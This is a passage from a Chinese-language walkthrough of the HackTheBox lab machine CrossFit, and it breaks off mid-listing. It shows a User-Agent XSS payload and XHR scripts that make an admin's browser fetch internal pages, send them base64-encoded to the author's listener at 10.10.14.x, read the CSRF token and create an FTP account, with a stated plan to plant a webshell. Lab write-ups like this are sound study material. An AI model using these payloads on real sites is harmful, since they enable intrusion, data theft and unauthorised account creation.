srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210811235550733"></p><p>应该是这个域名只有内网才能访问，不过问题不大，我们可以让管理员帮我们去访问！</p><h3 id="XSS-gt-CSRF"><a href="#XSS-gt-CSRF" class="headerlink" title="XSS -&gt; CSRF"></a>XSS -&gt; CSRF</h3><p>之前做过类似的，通过 <a href="https://tari.moe/2021/04/26/xssrf/i">XSS+XHR+SSRF 打 REDIS</a> ，这里其实也是差不多，说是 XSS+CSRF，理解成 XSS+SSRF也是没问题的，毕竟是让管理员帮我们请求内网，即我们无法访问的资源嘛。</p><p>构造 js 代码，这里为了方便（UA写一大串也不美观，下面 IP 变为 10.10.14.11 是因为openvpn断了，所以我本机IP变了），把代码保存至 <code>payload1.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://10.10.14.11:2233/&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    xhr2.send(<span class="built_in">this</span>.responseText); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p>上述代码用处为让管理员帮我们请求 <code>http://ftp.crossfit.htb</code> ，并把源码返回给我们，其中 <code>open()</code> 第三个参数为是否进行异步操作，默认为<code>true</code>，如果值为<code>false</code>，<code>send()</code>方法直到收到答复前不会返回<sup>[6]</sup></p><p>起一个HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>然后获取返回数据为 2233 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2233</span><br></pre></td></tr></table></figure><p>构造UA</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;img src=x onerror=&quot;document.body.appendChild(document.createElement(&#x27;script&#x27;)).src=&#x27;//10.10.14.11/payload1.js&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure><p>请求（一次接收不到数据可以多试两次，可能是网络环境不稳定原因？）</p><p><img src="/img/htb-crossfit/image-20210812003015028.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210812003015028.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210812003015028"></p><p>成功获取源码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.14.11:2233</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://gym-club.crossfit.htb/security_threat/report.php</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>886</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://gym-club.crossfit.htb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12 margin-tb&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-left&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-right&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>&gt;</span> Create New Account<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-bordered&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>No<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Creation Date<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">th</span> <span class="attr">width</span>=<span class="string">&quot;280px&quot;</span>&gt;</span>Action<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>看 Referer 字段，原来管理员一直在看我们目录爆破出来 <a href="http://gym-club.crossfit.htb/security_threat/report.php">http://gym-club.crossfit.htb/security_threat/report.php</a> 路径</p><p>源码本地打开</p><p><img src="/img/htb-crossfit/image-20210813000115657.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210813000115657.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210813000115657"></p><p>原来如此，原来是，管理ftp服务帐号的，怪不得，ftp的openssl信息里有 gym-club.crossfit.htb 域名相关的，，原来是一个网站一个ftp帐号之类的？</p><p>如果是的话，我们就可以通过构造数据包，创建一个ftp帐号，然后应该就可以访问网站根目录，在上传一句话getshell，计划通~</p><p>payload2.js 改为（至于为啥不像之前用POST而用GET，这里遇到了个问题，见<a href="#1%E3%80%81HTTP%E6%9C%8D%E5%8A%A1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%A5%E8%8E%B7%E5%8F%96payload2.js%EF%BC%8C%E4%BD%86nc%E5%B0%B1%E6%98%AF%E6%8E%A5%E6%94%B6%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%B8%80%E6%8E%A5%E6%94%B6%E7%AB%8B%E5%88%BB%E6%96%AD%E5%BC%80">遇到的问题1</a>）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span> + btoa(<span class="built_in">this</span>.responseText), <span class="literal">true</span>);</span><br><span class="line">        xhr2.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210814115200480.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814115200480.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814115200480"></p><p>这里接收到的为base64编码后的，即 <code>JavaScript</code> 的 <code>btoa</code>方法</p><p>代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FTP Hosting - Account Management<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12 margin-tb&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-left&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Add New Account<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pull-right&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts&quot;</span>&gt;</span> Back<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ftp.crossfit.htb/accounts&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;z9lTdbVfj0SAZjWoyUWLoWPEnRTXesPM2rt4n8No&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12 col-sm-12 col-md-12&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">strong</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12 col-sm-12 col-md-12&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">strong</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-xs-12 col-sm-12 col-md-12 text-center&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还有token，尝试两次，发现token会变，不能直接CSRF，好家伙…</p><p>一般来说，token是与会话绑定的，不同的会话token不一样，相同会话token一致，也就是说我们要通过xhr保持同一个会话，而不是先拿了token，等下 一次请求，会话不一致，还是创建不了帐号。</p><h3 id="结合-xss-bypass-anti-csrf-token-进行-CSRF"><a href="#结合-xss-bypass-anti-csrf-token-进行-CSRF" class="headerlink" title="结合 xss bypass anti-csrf-token  进行 CSRF"></a>结合 xss bypass anti-csrf-token  进行 CSRF</h3><p>攻击流程如下</p><ul><li>获取 <code>/accounts/create</code> 页面</li><li>解析返回页面dom节点获取 <code>_token</code> 值</li><li>带上 <code>_token</code> 向 <code>http://ftp.crossfit.htb/accounts</code> 接口发送 POST请求，并创建一个帐号密码为 tari/tari 的帐号</li><li>把请求结果待会本机监听的 <code>nc</code> 端口</li></ul><p>构造payload3.js，获取token</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// 通过解析 /accounts/create 页面 DOM 节点获取 _token</span></span><br><span class="line">        <span class="keyword">var</span> parser = <span class="keyword">new</span> DOMParser();</span><br><span class="line">        <span class="keyword">var</span> doc = parser.parseFromString(<span class="built_in">this</span>.responseText, <span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> token = doc.getElementsByName(<span class="string">&#x27;_token&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="comment">// 返回 _token 给本机监听的 nc 端口</span></span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span> + token, <span class="literal">false</span>);</span><br><span class="line">        xhr2.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 获取 /accounts/create 页面</span></span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p>正常获取</p><p><img src="/img/htb-crossfit/image-20210814145932159.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814145932159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814145932159"></p><p>构造payload4.js，这里注意需要设置 <code>withCredentials = true</code> 才能保证两个他们在同一会话中，见<a href="#2%E3%80%81xhr%E5%90%8C%E4%BC%9A%E8%AF%9D%E9%97%AE%E9%A2%98">遇到的问题2</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// 通过解析 /accounts/create 页面 DOM 节点获取 _token</span></span><br><span class="line">        <span class="keyword">var</span> parser = <span class="keyword">new</span> DOMParser();</span><br><span class="line">        <span class="keyword">var</span> doc = parser.parseFromString(<span class="built_in">this</span>.responseText, <span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> token = doc.getElementsByName(<span class="string">&#x27;_token&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// 3）创建结果返回给本机监听的 nc 端口</span></span><br><span class="line">                <span class="keyword">var</span> xhr3 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">                xhr3.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span> + btoa(<span class="built_in">this</span>.responseText), <span class="literal">false</span>);</span><br><span class="line">                xhr3.send();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 2）带上 _token 创建 tari 用户</span></span><br><span class="line">        xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        xhr2.withCredentials = <span class="literal">true</span>;</span><br><span class="line">        xhr2.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> params = <span class="string">&quot;username=tari&amp;pass=tari&amp;_token=&quot;</span> + token;</span><br><span class="line">        xhr2.send(params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 1) 获取 /accounts/create 页面</span></span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p>ok</p><p><img src="/img/htb-crossfit/image-20210814154031001.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814154031001.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814154031001"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 